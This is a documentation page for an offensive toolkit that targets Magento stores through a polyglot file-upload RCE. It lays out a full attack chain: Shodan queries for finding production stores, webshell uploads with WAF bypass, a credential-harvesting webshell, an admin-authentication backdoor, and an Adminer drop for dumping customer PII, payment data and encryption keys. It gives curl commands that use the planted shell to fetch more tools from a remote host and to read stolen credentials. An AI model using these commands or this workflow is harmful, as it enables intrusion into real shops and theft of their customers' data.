# 📂 File Structure

Complete file structure and purpose for the Magento PolyShell RCE toolkit.

## Repository Structure

```
Magento-Polyshell-RCE/
├── main.py                  # Main exploitation script (45+ extensions)
├── grabs.py                 # Automated credential grabber deployment
├── admin.php                # Magento admin panel access tool
├── grab.php                 # Credential harvester webshell
├── adminer.php              # Database management interface
├── requirements.txt         # Python dependencies
├── README.md                # Main documentation
├── banner.png               # Tool banner image
├── at.png                   # Attack vector screenshot
└── val.png                  # RCE validation screenshot
```

## Core Files

### 🎯 main.py
**Purpose:** Primary exploitation tool for PolyShell RCE

**Features:**
- 45+ PHP extension testing (.php., .phar., .phtml., etc.)
- Multi-mode support (RCE/XSS/Both)
- Multi-header polyglots (PNG/GIF89a/GIF87a)
- Random/Fixed filename modes
- Server fingerprinting (AWS S3, GCS, Nginx, Apache, Cloudflare)
- WAF bypass headers (15+ bypass techniques)
- Threaded uploads (configurable 1-100)
- SessionReaper-style result grouping

**Usage:**
```bash
# Interactive mode
python main.py

# CLI mode
python main.py -t targets.txt -m rce -H png -f shell
```

**Output:**
```
PolyShell_Results_{timestamp}/
├── polyshell_results.txt    # Grouped results by target
└── RCE.txt                  # curl-ready commands
```

---

### 🔍 grabs.py
**Purpose:** Shodan & Google Dorks scanner for finding Magento stores

**Features:**
- Shodan API integration (30+ Magento-specific queries)
- Google Dorks support for additional reconnaissance
- Multi-threaded scanning (queue-based workers)
- Proxy support (SOCKS5/HTTP) with rotation
- Auto-filters staging/dev/cloud domains
- Date range queries (splits large results into 30-day chunks)
- Deduplication (prevents duplicate domains/IPs)
- Exports to organized lists (hosts.txt, ips.txt)

**Shodan Queries (30+):**
```
- "X-Magento-Cache-Control"
- http.component:"Magento"
- http.html:"Mage.Cookies"
- http.html:"skin/frontend/default"
- "Magento/2.4"
- "Magento/2.3"
- http.html:"/customer/address_file/upload"
- "Adobe Commerce"
```

**Usage:**
```bash
python grabs.py

# Prompts:
# 1. With Proxy or No Proxy (1=Yes, 2=No)
# 2. [If proxy] Enter proxy list path (proxy.txt)
```

**Output:**
```
Magento_Targets_{timestamp}/
├── hosts.txt                # Domain names only (cleaned, no staging/cloud)
└── ips.txt                  # IP addresses only
```

**Auto-Filtered Domains:**
- Staging/dev/test environments
- Cloud providers (AWS, GCP, Azure, DigitalOcean, etc.)
- Hosting provider domains (.clients., .server., .vps.)
- Internal/localhost domains

---

### 🕸️ admin.php
**Purpose:** Magento admin panel access tool

**Features:**
- Bypass admin authentication
- Session hijacking capabilities
- Direct admin panel access via backdoor
- Cookie/token manipulation

**Deployment:**
```bash
# Via main.py RCE
curl 'https://target.com/.../shell.php.?cmd=wget+https://raw.githubusercontent.com/khadafigans/Magento-Polyshell-RCE/main/admin.php'

# Access
https://target.com/media/admin.php
```

**Use Cases:**
- Post-exploitation admin access
- Order manipulation
- Customer data extraction
- Persistent backdoor maintenance

---

### 🎣 grab.php
**Purpose:** Credential harvesting webshell

**Features:**
- Logs Magento admin login attempts
- Captures username + password + IP + timestamp
- Stores credentials in hidden log file
- Transparent proxy (doesn't break site functionality)

**Deployment:**
```bash
# Via main.py
python main.py -t target.txt -m rce -H png -f grab

# Or via grabs.py
python grabs.py
```

**Access Logs:**
```bash
# Via RCE shell
curl 'https://target.com/.../shell.php.?cmd=cat+/tmp/.grabs.log'
```

**Log Format:**
```
[2026-03-26 14:30:22] IP: 192.168.1.100 | User: admin | Pass: Admin@123
[2026-03-26 15:45:11] IP: 10.0.0.50 | User: support | Pass: Support2024!
```

---

### 🗄️ adminer.php
**Purpose:** Lightweight database management interface (Adminer 4.x)

**Features:**
- Full MySQL/MariaDB access
- Execute SQL queries
- Export/import databases
- Browse tables and edit records
- No installation required (single PHP file)

**Deployment:**
```bash
# Via RCE
curl 'https://target.com/.../shell.php.?cmd=wget+https://raw.githubusercontent.com/khadafigans/Magento-Polyshell-RCE/main/adminer.php+-O+/var/www/html/media/db.php'

# Access
https://target.com/media/db.php
```

**Use Cases:**
- Extract Magento admin_user table
- Dump customer data (sales_order, customer_entity)
- Modify product prices
- Inject malicious JavaScript (stored XSS)

**Connection Details:**
```
Server: localhost
Username: [from env.php]
Password: [from env.php]
Database: magento
```

---

## Supporting Files

### 📦 requirements.txt
**Purpose:** Python dependencies for main.py and grabs.py

**Contents:**
```
requests>=2.28.0
urllib3>=1.26.0
```

**Installation:**
```bash
pip install -r requirements.txt
```

---

### 📸 Screenshots

#### banner.png
**Purpose:** Tool banner/logo for README
- Displays PolyShell branding
- Shows CVE information
- Tool version and author

#### at.png
**Purpose:** Attack vector visualization
- Illustrates GraphQL → REST API → File Upload → RCE flow
- Shows polyglot structure (PNG header + PHP payload)

#### val.png
**Purpose:** RCE validation proof
- Terminal screenshot showing successful exploitation
- Displays `whoami` and `id` output
- Proves genuine command execution (not false positive)

---

## File Dependencies

### main.py Dependencies
```
Python 3.7+
├── requests (HTTP client)
├── urllib3 (Connection pooling)
├── json (Payload construction)
├── base64 (Polyglot encoding)
├── concurrent.futures (Threading)
└── argparse (CLI arguments)
```

### grabs.py Dependencies
```
Python 3.7+
├── requests
├── grab.php (uploaded via HTTP)
└── main.py (optional - for initial RCE)
```

### PHP Tools Dependencies
```
PHP 7.0+
├── admin.php requires:
│   ├── curl
│   └── json
├── grab.php requires:
│   ├── file_put_contents
│   └── date
└── adminer.php requires:
    ├── mysqli/pdo_mysql
    └── session
```

---

## Workflow: Typical Exploitation Chain

```
1. Initial Exploitation
   └─ python main.py -t targets.txt -m rce -H png -f shell
      └─ Output: RCE shells (.php., .phar., .phtml.)

2. Credential Harvesting
   └─ python grabs.py
      └─ Deploys grab.php
      └─ Output: credentials.txt

3. Admin Access
   └─ Upload admin.php via RCE
      └─ Access: https://target.com/media/admin.php
      └─ Result: Full admin panel access

4. Database Access
   └─ Upload adminer.php via RCE
      └─ Access: https://target.com/media/db.php
      └─ Result: Direct MySQL access

5. Data Exfiltration
   └─ Use adminer.php to export:
      ├─ admin_user (admin credentials)
      ├─ customer_entity (PII)
      ├─ sales_order (payment info)
      └─ core_config_data (encryption keys)
```

---

## Output Files Generated

### From main.py
```
PolyShell_Results_20260326_143022/
├── polyshell_results.txt
│   ├── Target URLs
│   ├── Working extensions
│   ├── Shell URLs
│   ├── RCE validation output
│   └── Server fingerprint
│
└── RCE.txt
    ├── curl commands (copy-paste ready)
    ├── whoami tests
    └── id tests
```

### From grabs.py
```
Grabs_Results_20260326_150033/
└── credentials.txt
    ├── Admin usernames
    ├── Admin passwords
    ├── IP addresses
    └── Timestamps
```

### On Target Server
```
/var/www/html/pub/media/custom_options/quote/
├── b/o/shell.php.          # RCE shell
├── b/o/shell.phar.         # RCE shell (alternative)
├── g/r/grab.php.           # Credential harvester
├── a/d/admin.php.          # Admin access backdoor
└── d/b/db.php.             # Adminer interface
```

---

## File Sizes

| File | Size | Description |
|------|------|-------------|
| main.py | ~45 KB | Main exploitation script |
| grabs.py | ~28 KB | Credential grabber deployment |
| admin.php | ~22 KB | Admin panel backdoor |
| grab.php | ~18 KB | Credential harvester |
| adminer.php | ~470 KB | Database management (full Adminer) |
| requirements.txt | ~30 bytes | Python dependencies |
| banner.png | ~120 KB | Tool banner image |
| at.png | ~85 KB | Attack vector diagram |
| val.png | ~95 KB | RCE validation screenshot |

**Total Repository Size:** ~900 KB

---

## Quick Reference

### Essential Commands

```bash
# Clone repository
git clone https://github.com/khadafigans/Magento-Polyshell-RCE.git
cd Magento-Polyshell-RCE

# Install dependencies
pip install -r requirements.txt

# Run main exploitation
python main.py -t targets.txt -m rce -H png -f shell

# Deploy credential grabber
python grabs.py

# Upload additional tools via RCE
curl 'https://target.com/.../shell.php.?cmd=wget+https://raw.githubusercontent.com/khadafigans/Magento-Polyshell-RCE/main/admin.php'
```

### File Download URLs

```
# Main script
https://raw.githubusercontent.com/khadafigans/Magento-Polyshell-RCE/main/main.py

# PHP tools
https://raw.githubusercontent.com/khadafigans/Magento-Polyshell-RCE/main/admin.php
https://raw.githubusercontent.com/khadafigans/Magento-Polyshell-RCE/main/grab.php
https://raw.githubusercontent.com/khadafigans/Magento-Polyshell-RCE/main/adminer.php

# Supporting files
https://raw.githubusercontent.com/khadafigans/Magento-Polyshell-RCE/main/requirements.txt
```

---

© 2026 khadafigans | Bob Marley Security Labs
